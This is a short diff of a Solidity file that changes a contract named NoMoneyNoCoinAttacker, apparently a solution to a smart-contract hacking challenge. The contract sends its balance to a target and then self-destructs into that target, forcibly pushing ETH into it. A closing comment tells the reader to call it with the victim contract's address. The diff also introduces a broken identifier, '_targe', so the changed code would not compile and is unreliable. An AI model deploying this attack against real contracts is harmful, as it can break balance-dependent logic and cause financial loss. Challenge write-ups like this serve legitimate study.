@@ -39,9 +39,9 @@ contract NoMoneyNoCoin is ERC20Basic {
 }
 
 contract NoMoneyNoCoinAttacker {
-  function transfer(address _to) payable public returns (bool){
-    _to.send(thisbal());
-    selfdestruct(_to);
+  function transfer(address _target) payable public returns (bool){
+    _target.send(thisbal());
+    selfdestruct(_targe);
     return true;
   }
   
@@ -49,3 +49,5 @@ contract NoMoneyNoCoinAttacker {
       return address(this).balance;
   }
 }
+
+//Call NoMoneyNoCoinAttacker.transfer("Contract Address") with some ETH
